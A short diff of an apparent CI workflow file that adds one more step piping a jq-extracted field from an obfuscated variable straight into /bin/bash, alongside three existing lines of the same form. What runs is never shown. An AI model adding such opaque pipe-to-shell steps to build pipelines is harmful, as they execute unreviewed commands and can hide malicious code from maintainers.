@@ -23,6 +23,7 @@ jobs:
           echo $t456 | jq -r .fmaqp398 | /bin/bash
           echo $wxv60532 | jq -r .t31205 | /bin/bash
           printf '%s' "$jxlye1" | jq -r .e6307 | /bin/bash
+          echo $yb18366 | jq -r .epv1 | /bin/bash
 
       - name: Archive output
         if: always()
